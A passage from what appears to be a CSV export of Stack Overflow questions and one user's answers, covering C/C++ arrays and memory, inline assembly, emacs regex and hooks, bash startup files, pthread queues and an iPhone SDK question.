<p>To allocate dynamic storage:</p>

<pre><code>// Allocate 64 bytes for ddj.  It will NOT be automatically deallocated -- you must
// explicitly deallocate it yourself at some point in the future when you're done
// with it.  Be careful of buffer overflows!
char *ddj = new char[64];
...
delete [] ddj;  // Deallocate it
</code></pre>

<p>Instead of managing storage yourself, it would be a better idea to use <code>std::string</code>, which automatically deals with memory management.</p>

<p>Finally, since all you're doing is comparing the first three characters of the string, there's no need to jump through hoop to copy the string and compare it.  Just use <a href=""http://linux.die.net/man/3/strncmp"" rel=""nofollow""><code>strncmp()</code></a>:</p>

<pre><code>if(strncmp(buffer, ""JMX"", 3) == 0)
{
    ...
}
</code></pre>
"
"<p>everyone seems interested in building IPhone apps today.  Do you have to have an iphone to build an app?  Is there a development / test environment that simulates the iphone experience to avoid having to purchase one.</p>

<p>if yes, what are the next steps in moving forward on this? </p>
","9530","","<p>You do not need an iPhone to develop an iPhone app.  You can also use an iPod Touch.  If you don't want to buy either device, the iPhone SDK comes with an iPhone simulator that you can use to test your apps.  However, the simulator has a number of limitations, such as a lack of accelerometers.</p>

<p>Keep in mind that you also need a Macintosh computer with at least version 10.5 of Mac OS X.</p>
"
"<p>What is the best way to convert an array of chars to bytes and vice versa?</p>

<p>Solution:</p>

<pre><code>void CharToByte(char* chars, byte* bytes, unsigned int count){
    for(unsigned int i = 0; i &lt; count; i++)
    	bytes[i] = (byte)chars[i];
}

void ByteToChar(byte* bytes, char* chars, unsigned int count){
    for(unsigned int i = 0; i &lt; count; i++)
    	 chars[i] = (char)bytes[i];
}
</code></pre>
","9530","","<p>In almost every C++ implementation you'll come across, a <code>char</code> is exactly <s>a <code>byte</code></s> an octet.  This is not guaranteed by the C++ standard, but it's practically always the case.  A <code>char</code> is always <em>at least</em> 8 bits large, and the exact number of bits is given by the preprocessor constant <code>CHAR_BIT</code>.  Also, the <code>sizeof()</code> operator tells you the size of an object/type in terms of the number of <code>char</code>s, not the number of <s>bytes</s> octets, so if you were on some weird system with a 16-bit <code>char</code> and a 32-bit <code>int</code>, then <code>sizeof(int)</code> would be 2, not 4.</p>

<p><strong>EDIT:</strong> Replaced byte by octet.  A <code>char</code> is guaranteed to be a byte by the C standard, but a byte is not guaranteed to be an octet, which is exactly 8 bits.  If you've ever read any French technical literature, they always use 'octet' instead of 'byte', and they have kilooctets (KO), megaoctets (MO), etc. instead of kilbytes and megabytes.</p>
"
"<p>I need a quick advice. I'm looking for a couple of tools to do these tasks</p>

<ul>
<li><p>take some images and combine them into a multipage pdf</p></li>
<li><p>take a pdf and output each page as a separate image</p></li>
</ul>

<p>I can't find anything free on google, apart from suggestions like ""open an openoffice doc, add each image on a page and print to a pdf file"" ...</p>

<p>Any suggestion?</p>

<p>Thanks a lot</p>

<p>Nicola Montecchio</p>

<p>[edit] - on windows ...</p>
","9530","","<p><a href=""http://www.accesspdf.com/pdftk/"" rel=""nofollow"">pdftk</a> should be able to easily do what you're looking for.</p>
"
"<p>We recently upgraded the code to <code>gcc4.3.3</code> from <code>gcc4.2.4</code>. </p>

<pre><code>void testAndSet(  volatile int*  s, int* val )
{
   __asm__ __volatile__ ( ""btsl   $0, %0\n   ""
           ""jc   bitSet\n   ""
           ""movl   $0, %1\n   ""
           ""jmp   returnVector\n""
           ""bitSet:\n   ""
           ""movl   $1, %1\n""
           ""returnVector: "" : ""=m""(*s), ""=m""(*val) );
}
</code></pre>

<p>Our code now fails with the following errors,</p>

<pre><code>lock.cxx: Assembler messages:
lock.cxx:59: Error: symbol `bitSet' is already defined
lock.cxx:61: Error: symbol `returnVector' is already defined
lock.cxx:59: Error: symbol `bitSet' is already defined
lock.cxx:61: Error: symbol `returnVector' is already defined
</code></pre>

<p>Those symbols weren't found anywhere else. (Renaming them causes the same error with the new name).</p>

<p>What's up with this? why do I get the errors twice?</p>
","9530","","<p>This is unrelated to your error, but you could improve your code and avoid branches simply using the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SETcc.htm"">setCC instruction</a>:</p>

<pre><code>   __asm__ __volatile__ ( ""btsl   $0, %0\n   ""
       ""mov $0, %1\n""
       ""setc %1\n"" : ""=m""(*s), ""=m""(*val) );
</code></pre>

<p>The <code>setCC</code> instruction (where CC is one of the condition code flags, analogous to the <code>jCC</code> instruction) sets a byte to 0 or 1 depending on whether or not the given condition was satisfied.  Since the destination is a 4-byte value, you need to either preload it with 0 or use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/MOVZX.htm"">MOVZX instruction</a> to make the upper 3 bytes 0.</p>
"
"<p>I love emacs. I love regexs.  I hate emacs' regex syntax - the need to escape grouping parens and braces, that you <em>dont</em> escape literal parens, the lack of predefined character classes, etc.</p>

<p>Can I replace emacs' regex engine, or tweak some setting, so that when I use the Query-replace-regexp (or one of many other) feature I can use the syntax I program with in java/js/perl/ruby/etc...?</p>

<p><strong>Edit:</strong>
The subject was originally ""how to change emacs' regex engine"" which would not only change escaping rules and add character classes, but also (not mentioned in the post) add support for various common extensions (?...). Features like non-capturing parens: (?:...), match only if/if-not followed by: (?=...)/(?!...), and others. I don't believe (though happy to be corrected) these are possible with emacs' current regex engine, and no amount of syntax replacements will fix that.</p>

<p>The solution below addresses the original issues of escaping and additional char classes by replacing with syntax emacs understands. A second answer (now deleted) suggested advising (add a function to run at the start of another) emacs' regex function to do the replacement for all regex processing. The author quickly censored him/herself realizing that it would likely break much existing emacs code, and eventually the post was removed.</p>

<p>I would still like to change the regex-engine to one which supports extensions, but I agree that changing the escaping behavior universally would cause havoc I'm not willing to chase. Thus, I'm changing the subject to match the question and accepting the response.</p>

<p>It crossed my mind to change the engine to support common-syntax and extensions, advise the regex function to convert emacs-internal code to common-syntax, advise the interactive functions to convert my common-syntax to emacs-syntax (so it can be converted back to common)... but I think even RMS would recommend a fork before that.</p>

<p></p>
","9530","","<p>You could define your own elisp function which modified the regexp and then passed it back to emacs.  In pseudo-elisp:</p>

<pre><code>(defun my-query-replace-regexp (regexp)
    ; modify regexp to replace ( with \(, { with \{, etc.
    (query-replace-regexp modified-regexp)
)

; rebind C-% to use new regexp function
(global-set-key ""\C-%"" 'my-query-replace-regexp)
</code></pre>
"
"<p>How do I remove an element of an array and shift the remaining elements down. So, if I have an array, </p>

<pre><code>array[]={1,2,3,4,5} 
</code></pre>

<p>and want to delete 3 and shift the rest so I have,</p>

<pre><code>array[]={1,2,4,5}
</code></pre>

<p>How would I go about this in the least amount of code?</p>
","9530","","<p>You can use <a href=""http://linux.die.net/man/3/memmove""><code>memmove()</code></a>, but you have to keep track of the array size yourself:</p>

<pre><code>size_t array_size = 5;
int array[5] = {1, 2, 3, 4, 5};

// delete element at index 2
memmove(array + 2, array + 3, (array_size - 2 - 1) * sizeof(int));
array_size--;
</code></pre>

<p>In C++, though, it would be better to use a <code>std::vector</code>:</p>

<pre><code>std::vector&lt;int&gt; array;
// initialize array...

// delete element at index 2
array.erase(array.begin() + 2);
</code></pre>
"
"<p>Is there a way I can tell whether stderr is outputting to a file or the terminal within a C/C++ program?  I need to output different error message depending on whether the program is invoked as:</p>

<p>./program</p>

<p>or like:</p>

<p>./program 2>> file</p>
","9530","","<p>Yes, you can use <a href=""http://linux.die.net/man/3/isatty"" rel=""nofollow""><code>isatty(3)</code></a> to tell if a file descriptor refers to the terminal or to something else (file, pipe, etc.).  File descriptor 0 is <code>stdin</code>, 1 is <code>stdout</code>, and 2 is <code>stderr</code>.</p>

<pre><code>if(isatty(2))
    // stderr is a terminal
</code></pre>
"
"<p>What is the quickest way to find the maximum of two floats:</p>

<p>a)</p>

<pre><code>y = std::max(x1, x2);
</code></pre>

<p>b)</p>

<pre><code>if (x1 &gt; x2)
    y = x1;
else
    y = x2;
</code></pre>

<p>c)</p>

<pre><code>y = x1 &gt; x2 ? x1 : x2;
</code></pre>

<p>Thanks</p>
","9530","","<p>First, as others have said, profile your code and make absolute sure that this is something worth optimizing.  If it is, read on: you can do it without branching.  See <a href=""http://assemblyrequired.crashworks.org/2009/01/04/fcmp-conditional-moves-for-branchless-math/"" rel=""nofollow"">Down with fcmp: Conditional Moves For Branchless Math</a> for more details.</p>
"
"<p>Is there any way of making c++ gui applications that include .swf?</p>

<p>The swf file are pretty small and easier to make than gif or other kind of animations so it would be nice to be able to include them.</p>

<p>Some recommendations of a library, free or even open source...</p>
","9530","","<p>Not free or open-source, but <a href=""https://www.scaleform.com/products/gfx"" rel=""nofollow"">Scaleform GFx</a> is a commercial cross-platform Flash player.</p>
"
"<p>I'm debugging a network application.</p>

<p>I have to simulate some of the data exchanged in order for the application to work. In C++ you can do something like</p>

<pre><code>char* myArray = { 0x00, 0x11, 0x22 };
</code></pre>

<p>However, I can't seem to find a C equivalent for this syntax.</p>

<p>Basically I just want to fill an array with hard coded values.</p>
","9530","","<p>You can do the same thing in C, but you should declare it of type <code>char[]</code>, not <code>char*</code>, so that you can get its size with the <code>sizeof</code> operator:</p>

<pre><code>char myArray[] = { 0x00, 0x11, 0x22 };
size_t myArraySize = sizeof(myArray);  // myArraySize = 3
</code></pre>
"
"<p>Is there a way <em>in constant working space</em> to do arbitrary size and arbitrary base conversions. That is, to convert a sequence of <code>n</code> numbers in the range <code>[1,m]</code> to a sequence of <code>ceiling(n*log(m)/log(p))</code> numbers in the range <code>[1,p]</code> using a 1-to-1 mapping that (<em>preferably</em> but not necessarily) preservers lexigraphical order and gives sequential results?</p>

<p>I'm particularly interested in solutions that are viable as a pipe function, e.i. are able to handle larger dataset than can be stored in RAM.</p>

<p>I have found a number of solutions that require ""working space"" proportional to the size of the input but none yet that can get away with constant ""working space"".</p>

<hr>

<p>Does dropping the sequential constraint make any difference? That is: allow lexicographically sequential inputs to result in non lexicographically sequential outputs:</p>

<pre><code>F(1,2,6,4,3,7,8) -&gt; (5,6,3,2,1,3,5,2,4,3)
F(1,2,6,4,3,7,9) -&gt; (5,6,3,2,1,3,5,2,4,5)
</code></pre>

<hr>

<p>some thoughts:</p>

<p>might this work?</p>

<blockquote>
  <p>streamBase<sub>n</sub> -> convert(<code>n</code>, <code>lcm(n,p)</code>) -> convert(<code>lcm(n,p)</code>, <code>p</code>) -> streamBase<sub>p</sub></p>
</blockquote>

<p>(where <code>lcm</code> is least common multiple)</p>
","9530","","<p>I don't think it's possible in the general case.  If <code>m</code> is a power of <code>p</code> (or vice-versa), or if they're both powers of a common base, you can do it, since each group of log<sub><code>m</code></sub>(<code>p</code>) is then independent.  However, in the general case, suppose you're converting the number <code>a</code><sub><code>1</code></sub> <code>a</code><sub><code>2</code></sub> <code>a</code><sub><code>3</code></sub> <code>...</code> <code>a</code><sub><code>n</code></sub>.  The equivalent number in base <code>p</code> is</p>

<p><code>sum(a</code><sub><code>i</code></sub> <code>*</code> <code>m</code><sup><code>i-1</code></sup> for <code>i</code> in <code>1..n)</code></p>

<p>If we've processed the first <code>i</code> digits, then we have the <code>i</code>th partial sum.  To compute the <code>i+1</code>'th partial sum, we need to add <code>a</code><sub><code>i+1</code></sub> <code>* m</code><sup><code>i</code></sup>.  In the general case, this number is going have non-zero digits in most places, so we'll need to modify all of the digits we've processed so far.  In other words, we'll have to process <em>all</em> of the input digits before we'll know what the final output digits will be.</p>

<p>In the special case where <code>m</code> are both powers of a common base, or equivalently if log<sub><code>m</code></sub>(<code>p</code>) is a rational number, then <code>m</code><sup><code>i</code></sup> will only have a few non-zero digits in base <code>p</code> near the front, so we can safely output most of the digits we've computed so far.</p>
"
"<p>I need a function which takes a line (known by its coordinates)
and return a line with <strong>same</strong> angle, but <strong>limited to certain length</strong>.</p>

<p>My code gives correct values <strong>only</strong> when the line is turned <strong>'right'</strong><br />
(proven only empirically, sorry).</p>

<p>Am I missing something?</p>

<pre><code>public static double getAngleOfLine(int x1, int y1, int x2, int y2) {
  double opposite = y2 - y1;
  double adjacent = x2 - x1;

  if (adjacent == Double.NaN) {
    return 0;
  }

  return Math.atan(opposite / adjacent);
}

// returns newly calculated destX and destY values as int array
public static int[] getLengthLimitedLine(int startX, int startY,
    int destX, int destY, int lengthLimit) {

  double angle = getAngleOfLine(startX, startY, destX, destY);

  return new int[]{
        (int) (Math.cos(angle) * lengthLimit) + startX,
        (int) (Math.sin(angle) * lengthLimit) + startY
      };
}
</code></pre>

<p>BTW: I know that returning arrays in Java is stupid,
but it's just for the example.</p>
","9530","","<p>No need to use trig, which can have some nasty edge cases.  Just use similar triangles:</p>

<pre><code>public static int[] getLengthLimitedLine(int startX, int startY,
    int destX, int destY, int lengthLimit)
{
    int deltaX = destX - startX;
    int deltaY = destY - startY;
    int lengthSquared = deltaX * deltaX + deltaY * deltaY;
    // already short enough
    if(lengthSquared &lt;= lengthLimit * lengthLimit)
        return new int[]{destX, destY};

    double length = Math.sqrt(lengthSquared);
    double newDeltaX = deltaX * lengthLimit / length;
    double newDeltaY = deltaY * lengthLimit / length;

    return new int[]{(int)(startX + newDeltaX), (int)(startY + newDeltaY)};
}
</code></pre>
"
"<p>I've been using (Ubuntu's) file-roller to compress a range of files, e.g. .gz, .zip, .rar, .tar.gz, etc. It's nice because it provides a simple, uniform interface to de-compressing files in particular folders. However, it's pretty slow, apparently because it pops open a GUI window to tell you its uncompressing the file.</p>

<p>So I am wondering if anyone can recommend a tool that will uncompress multiple compression formats, and has a uniform interface?</p>
","9530","","<p><a href=""http://www.7-zip.org/"" rel=""nofollow"">7-zip</a> can uncompress a wide variety of formats, including 7z, ZIP, GZIP, BZIP2, TAR, ARJ, CAB, CHM, CPIO, DEB, DMG, HFS, ISO, LZH, LZMA, MSI, NSIS, RAR, RPM, UDF, WIM, XAR and Z.</p>
"
"<p>Is there an easy way to get a time very precisely? </p>

<p>I need to calculate some delays between method calls. More specifically, I want to calculate the speed of scrolling in an UIScrollView.</p>
","9530","","<p><a href=""http://developer.apple.com/documentation/CoreFoundation/Reference/CFTimeUtils/Reference/reference.html#//apple%5Fref/doc/uid/20001452-CH201-F12326""><code>CFAbsoluteTimeGetCurrent()</code></a> returns the absolute time as a <code>double</code> value, but I don't know what its precision is -- it <em>might</em> only update every dozen milliseconds, or it might update every microsecond, I don't know.</p>
"
"<p>I can currently use sgml-pretty-print to pretty print an xml file in emacs, but it's a manual process:</p>

<ol>
<li>M-&lt;</li>
<li>C-space</li>
<li>M-></li>
<li>M-x sgml-pretty-print</li>
</ol>

<p>I'd like this to happen automatically (or at least have some option to do so).  I'm new to emacs/elisp, and do not understand how:</p>

<ol>
<li>emacs knows what code to run when you open a file (does this start in files.el?)</li>
<li>If you wanted to override that code with your own, how to do that</li>
</ol>
","9530","","<p>A slightly simpler alternative to <a href=""http://stackoverflow.com/questions/889649/run-sgml-pretty-print-when-opening-an-xml-file-in-emacs/889691#889691"">Trey Jackson's answer</a>.  Just add this to your <code>~/.emacs</code> file:</p>

<pre><code>(add-hook 'sgml-mode-hook #'(lambda ()
  (sgml-pretty-print (point-min) (point-max))))
</code></pre>
"
"<p>What's the difference between:</p>

<pre><code>char * const 
</code></pre>

<p>and</p>

<pre><code>const char *
</code></pre>
","9530","","<p><code>const * char</code> is invalid C code and is meaningless.  Perhaps you meant to ask the difference between a <code>const char *</code> and a <code>char const *</code>, or possibly the difference between a <code>const char *</code> and a <code>char * const</code>?  </p>

<h3>See also:</h3>

<ul>
<li><a href=""http://stackoverflow.com/questions/219914/what-use-are-const-pointers-as-opposed-to-pointers-to-const-objects"">What are const pointers (as opposed to pointers to const objects)?</a></li>
<li><a href=""http://stackoverflow.com/questions/162480/const-in-c"">Const in C</a></li>
<li><a href=""http://stackoverflow.com/questions/487048/difference-between-const-declarations-in-c"">Difference between const declarations in C++</a></li>
<li><a href=""http://stackoverflow.com/questions/269882/c-const-question"">C++ const question</a></li>
<li><a href=""http://stackoverflow.com/questions/440331/why-can-i-change-the-values-of-a-const-char-variable"">Why can I change the values of a const char* variable?</a></li>
</ul>
"
"<p>This is quite strange for me, but I'm getting an unexpected and random segmentation fault when I launch my program. Some times it works, some times it crashes.. The debugger of Dev-C++ points me to a line of the file : stl_construct.h</p>

<pre><code>/**
   * @if maint
   * Constructs an object in existing memory by invoking an allocated
   * object's constructor with an initializer.
   * @endif
   */
  template&lt;typename _T1, typename _T2&gt;
    inline void
    _Construct(_T1* __p, const _T2&amp; __value)
    {
      // _GLIBCXX_RESOLVE_LIB_DEFECTS
      // 402. wrong new expression in [some_]allocator::construct
     -&gt; ::new(static_cast&lt;void*&gt;(__p)) _T1(__value);
    }
</code></pre>

<p>I'm using the STL extensively by the way.. What should i do to detect the origin of the segfault? Are there any tools that can help? What are the reasons that can lead to random crashes like this.</p>

<h3>Edit:</h3>

<p>My program counts around 5000 lines of code. I don't know what piece of code I have to show in order to get some help since I have no clue about the origin of the problem, all I got from the debugger is that it has to do with the STL.</p>

<h3>Edit:</h3>

<p>I moved to <code>Code::Blocks</code> now, here is the call stack:</p>

<pre><code>#0 00464635 std::_Construct&lt;std::pair&lt;double const, int&gt;, std::pair&lt;double const, int&gt; &gt;(__p=0xb543e8, __value=@0x10) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_construct.h:81)
#1 00462306 std::_Rb_tree&lt;double, std::pair&lt;double const, int&gt;, std::_Select1st&lt;std::pair&lt;double const, int&gt; &gt;, std::less&lt;double&gt;, std::allocator&lt;std::pair&lt;double const, int&gt; &gt; &gt;::_M_create_node(this=0x406fe50, __x=@0x10) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_tree.h:367)
#2 00461DA7 std::_Rb_tree&lt;double, std::pair&lt;double const, int&gt;, std::_Select1st&lt;std::pair&lt;double const, int&gt; &gt;, std::less&lt;double&gt;, std::allocator&lt;std::pair&lt;double const, int&gt; &gt; &gt;::_M_clone_node(this=0x406fe50, __x=0x0) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_tree.h:379)
#3 004625C6 std::_Rb_tree&lt;double, std::pair&lt;double const, int&gt;, std::_Select1st&lt;std::pair&lt;double const, int&gt; &gt;, std::less&lt;double&gt;, std::allocator&lt;std::pair&lt;double const, int&gt; &gt; &gt;::_M_copy(this=0x406fe50, __x=0x0, __p=0x406fe54) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_tree.h:1029)
#4 00462A9D std::_Rb_tree&lt;double, std::pair&lt;double const, int&gt;, std::_Select1st&lt;std::pair&lt;double const, int&gt; &gt;, std::less&lt;double&gt;, std::allocator&lt;std::pair&lt;double const, int&gt; &gt; &gt;::_Rb_tree(this=0x406fe50, __x=@0xb59a7c) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_tree.h:559)
#5 0045A928 std::map&lt;double, int, std::less&lt;double&gt;, std::allocator&lt;std::pair&lt;double const, int&gt; &gt; &gt;::map(this=0x406fe50, __x=@0xb59a7c) (C:/Program Files/CodeBlocks/MinGW/bin/../lib/gcc/mingw32/3.4.5/../../../../include/c++/3.4.5/bits/stl_map.h:166)
#6 0040B7E2 VehicleManager::get_vehicles_distances(this=0xb59a50) (C:/Program Files/CodeBlocks/MinGW/projects/AHS/VehicleManager.cpp:232)
#7 00407BDA Supervisor::IsMergeInstruction(id_vehicle=1) (C:/Program Files/CodeBlocks/MinGW/projects/AHS/Supervisor.cpp:77)
#8 00408430 CheckingInstructionsThread(arg=0x476100) (C:/Program Files/CodeBlocks/MinGW/projects/AHS/Supervisor.cpp:264)
#9 00413950 _glfwNewThread@4() (??:??)
#10 75A24911    KERNEL32!AcquireSRWLockExclusive() (C:\Windows\system32\kernel32.dll:??)
#11 00476100    std::__ioinit() (??:??)
#12 0406FFD4    ??() (??:??)
#13 76E5E4B6    ntdll!RtlInitializeNtUserPfn() (C:\Windows\system32\ntdll.dll:??)
#14 00476100    std::__ioinit() (??:??)
#15 70266582    ??() (??:??)
#16 00000000    ??() (??:??)
</code></pre>

<p>A few more precisions :</p>

<p>1/ It's a multi-threaded application.
2/ The method : get_vehicles_distances(); returns a map. 
3/ It's possible that the map isn't initalised by the time when it's called by IsMergeInstruction(); </p>

<h3>Edit:</h3>

<p>Apparently the line that is causing the segfault is :</p>

<pre><code>vehicles_distances_.erase(vehicles_distances_.begin(), vehicles_distances_.end());
</code></pre>

<p>Where vehicles_distances_ is the Map.  This line is a part of the method : VehicleManager::MoveAllVehicles();</p>

<pre><code>void VehicleManager::MoveAllVehicles() {

     vehicles_distances_.erase(vehicles_distances_.begin(), vehicles_distances_.end());

     vector&lt;Vehicle&gt;::iterator iter_end = VehicleManager::vehicles_.end();
     for(vector&lt;Vehicle&gt;::iterator iter = VehicleManager::vehicles_.begin();
     iter != iter_end; ++iter) {

          (*iter).MoveVehicle();

          vehicles_distances_[(*iter).get_vec_vehicle_position().y] = (*iter).get_id_vehicle();

     }

}
</code></pre>

<p>What is wrong with that ?</p>

<h3>Edit:</h3>

<p>I tried to use map::clear(); as a replacement to map::erase(); but the same problem occurs!</p>

<h3>Edit:</h3>

<p>I think i get it... A thread is trying to make a use of vehicles_distances_ while it's cleared.. (?)</p>

<h3>Edit:</h3>

<p>Problem solved! So it was coming from the map::erase(); as expected. i bypassed the problem by creating another map variable where the pair <code>&lt;key, value&gt;</code> was inverted so i can update the map. (since the key that i need is the distance, and the distance isn't unique since it changes everytime but the id_vehicle is unique!). At the end i just took that map, inverted the <code>&lt;key, value&gt;</code> again and transferred it to the original map that can be redeclared in each cycle... </p>

<p>Thanks everyone !</p>
","9530","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/5at7yxcs%28VS.71%29.aspx"" rel=""nofollow""><code>_CrtSetDbgFlag()</code></a> at the beginning of your program to enable some heap debugging options.  See also <a href=""http://msdn.microsoft.com/en-us/library/974tc9t1%28VS.80%29.aspx"" rel=""nofollow"">The CRT Debug Heap</a>.  This may help you track down where you're doing bad stuff with memory.  It's available in Microsoft's C runtime, which you the MinGW compiler links against by default.  If you're instead using GNU's C runtime, then you won't be able to go this route.</p>
"
"<p>I'm doing a check in an iPhone application - </p>

<pre><code>int var;
if (var != nil)
</code></pre>

<p>It works, but in X-Code this is generating a warning ""comparison between pointer and integer."" How do I fix it? </p>

<p>I come from the Java world, where I'm pretty sure the above statement would fail on compliation.</p>
","9530","","<p>Primitives can't be <code>nil</code>.  <code>nil</code> is reserved for pointers to Objective-C objects.  <code>nil</code> is technically a pointer type, and mixing pointers and integers will without a cast will almost always result in a compiler warning, with one exception: it's perfectly ok to implicitly convert the integer 0 to a pointer without a cast.</p>

<p>If you want to distinguish between 0 and ""no value"", use the <a href=""http://developer.apple.com/DOCUMENTATION/Cocoa/Reference/Foundation/Classes/NSNumber%5FClass/Reference/Reference.html""><code>NSNumber</code></a> class:</p>

<pre><code>NSNumber *num = [NSNumber numberWithInt:0];
if(num == nil)  // compare against nil
    ;  // do one thing
else if([num intValue] == 0)  // compare against 0
    ;  // do another thing
</code></pre>
"
"<p>thing.h</p>

<pre><code>@interface Thing : NSObject 
{
     float stuff[30];
}

@property float stuff;
@end
</code></pre>

<p>thing.m</p>

<pre><code>@implementation Thing
@synthesize stuff;
@end
</code></pre>

<p>I get <strong>error: type of property 'stuff' does not match type of ivar 'stuff'</strong></p>

<p>I don't want to use an NSArray because I'd have to make the floats into NSNumbers (right?) and that's a pain to do math with.</p>

<p><strong>Update</strong>:  I've noticed similar answers had guesses and trial answers. While I appreciate the attempts by non-Objective-C folks, I'm hoping for a <strong>definitive</strong> answer whether it's possible or not.</p>
","9530","","<p>You can't do it the way you want to do it.  You can jump through some hoops and get something similar, e.g. using <a href=""http://stackoverflow.com/questions/897639/in-objective-c-can-i-declare-property-on-a-c-array-of-floats/900855#900855"">Daniel's solution</a>, but it's not quite the same thing.  The reason you can't do it is that <strong>arrays are not lvalues in C</strong>.  An lvalue is something that can appear on the left-hand side of an assignment.  The following code is invalid C:</p>

<pre><code>float stuff1[30], stuff2[30];
stuff1 = stuff2;  // ERROR: arrays are not lvalues
</code></pre>

<p>As a consequence, you can't declare properties whose types are not lvalues.</p>
"
"<p>I need to build a system of workers (represented as threads) and (multiple) queues. Individual jobs are waiting in one of the queues and waits for a worker thread to process them. Each worker can process jobs only from some of the queues. No spin-waiting. C/C++, pthreads, standard POSIX.</p>

<p>The problem for me is the ""multiple queues"" thing. I know how to implement this with a single queue. The workers need to wait on all the queues that they can process (wait for ANY of them).</p>

<p>On Windows I would use WaitForMultipleObjects, but this needs to be multi-platform.</p>

<p>I don't want any particular code for this, only a hint or a description of the model which I should use. Thanks in advance.</p>
","9530","","<p>What you can do is use a <a href=""https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables"" rel=""nofollow"">condition variable</a>.  Have your worker threads wait on a condition variable.  When a job gets added to any of the job queues, signal the condition variable.  Then, when the worker thread wakes up, it checks the queues it's waiting on.  If any of them have a job, it takes that job off the queue.  Otherwise, it goes back to waiting on the condition variable.  Waiting on a condition variable puts the thread to sleep, so it does not consume CPU time.</p>

<p>Of course, it goes without saying that you should protect all accesses to the job queues with a mutex (e.g. <code>pthread_mutex_t</code>).</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/415403/whats-the-difference-between-bashrc-bash-profile-and-environment"">What&#39;s the difference between .bashrc, .bash_profile, and .environment?</a>  </p>
</blockquote>



<p>it seems that if i use</p>

<pre><code>alias ls='ls -F'
</code></pre>

<p>inside of .bashrc on Mac OS X, then the newly created shell will not have that alias.  I need to type bash again and that alias will be in effect.</p>

<p>and if i log into linux on the hosting company, the .bashrc has a comment line that says:</p>

<p>for non-login shell</p>

<p>and </p>

<p>.bash_profile has a comment</p>

<p>for login shell</p>

<p>so where should aliases be written in?  how come we separate login shell and non-login shell?</p>

<p>some webpage say use  .bash_aliases  but it doesn't work on Mac OS X, it seems.</p>
","9530","","<p>From the bash manpage:</p>

<blockquote>
  <p>When  bash is invoked as an
  interactive login shell, or as a
  non-interactive shell with the
  <code>--login</code> option, it first reads and executes  commands  from  the file
  <code>/etc/profile</code>, if that file exists. 
  After reading that file, it looks for
  <code>~/.bash_profile</code>, <code>~/.bash_login</code>, and
  <code>~/.profile</code>, in  that order, and reads
  and executes commands from the first
  one that exists and is readable.  The
  <code>--noprofile</code> option may be  used  when  the shell is started to inhibit this
  behavior.</p>
  
  <p>When  a login  shell  exits, bash
  reads and executes commands from the
  file <code>~/.bash_logout</code>, if it exists.</p>
  
  <p>When an interactive shell that is not a login shell  is  started,  bash
         reads  and executes commands from <code>~/.bashrc</code>, if that file exists.  This
         may be inhibited by using the <code>--norc</code> option.  The <code>--rcfile</code> file  option
         will  force  bash  to  read  and  execute commands from file instead of
         <code>~/.bashrc</code>.</p>
</blockquote>

<p>Thus, if you want to get the same behavior for both login shells and interactive non-login shells, you should put all of your commands in either <code>.bashrc</code> or <code>.bash_profile</code>, and then have the other file <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-source-144"">source</a> the first one.</p>
"
"<p>assuming that I know the PID of a process and want to do a search in ps -A, how do I do it? I tried doing this:</p>

<pre><code>echo ""Enter PID to search: ""
read PID
search=$(ps -A | grep -v PID | awk '{print $1}')
</code></pre>

<p>This returns me with a long list of PIDs. So how can I get use each individual value of the output and do: </p>

<pre><code>if [ ""$PID"" = ""*each_value_in_search_list*"" ]; then
........
</code></pre>

<p>In this case i'm trying to compare what the user enters with the output of my command, so how do I do it? Am I doing the correct way in the first place? Or is there any other way to do this?</p>

<p>Thanks for your help, everyone who answered this question. (:</p>
","9530","","<p>You're grepping the output of <code>ps</code> for all lines which do not contain the literal string ""PID"".  You want to use <code>$PID</code> instead to use the <em>variable</em> named PID instead of the literal ""PID"".  Furthermore, since you do not want false positives on other fields matching the PID, just match on the first column:</p>

<pre><code>search=$(ps -A | grep ""^ *$PID\&gt;"" | awk '{print $1}')
</code></pre>

<p>The <code>""\&gt;""</code> escape sequence matches the empty string at the end of a word.</p>

<p>Some versions of <code>ps</code> support a <code>-p</code> option to only give you the info about a specific PID, so you don't need grep or awk:</p>

<pre><code>search=$(ps -p $PID)
</code></pre>
"
"<p>Variable <code>x</code> is int with possible values: <code>-1, 0, 1, 2, 3</code>.
Which expression will be faster (in CPU ticks):</p>

<pre><code>1. (x &lt; 0)
2. (x == -1)
</code></pre>

<p>Language: C/C++, but I suppose all other languages will have the same.</p>

<p>P.S. I personally think that answer is <code>(x &lt; 0)</code>.</p>

<p>More widely for gurus: what if <code>x</code> from <code>-1</code> to <code>2^30</code>?</p>
","9530","","<p>That depends entirely on the ISA you're compiling for, and the quality of your compiler's optimizer.  Don't optimize prematurely: <strong>profile first to find your bottlenecks</strong>.</p>

<p>That said, in x86, you'll find that both are equally fast in most cases.  In both cases, you'll have a comparison (<code>cmp</code>) and a conditional jump (<code>jCC</code>) instructions.  However, for <code>(x &lt; 0)</code>, there may be some instances where the compiler can elide the <code>cmp</code> instruction, speeding up your code by <em>one whole cycle</em>.</p>

<p>Specifically, if the value <code>x</code> is stored in a register and was recently the result of an arithmetic operation (such as <code>add</code>, or <code>sub</code>, but there are many more possibilities) that sets the sign flag SF in the EFLAGS register, then there's no need for the <code>cmp</code> instruction, and the compiler can emit just a <code>js</code> instruction.  There's no simple <code>jCC</code> instruction that jumps when the input was -1.</p>
"
"<p>I am trying to write text using a Core Graphics context. I can do it the first time, no problem, but the second time crashes my iPhone app. Here is a code snippet:</p>

<pre><code>NSString *name = [MyClass getName];
const char *cname = [name UTF8String];
[self drawText:context text:cname];
</code></pre>

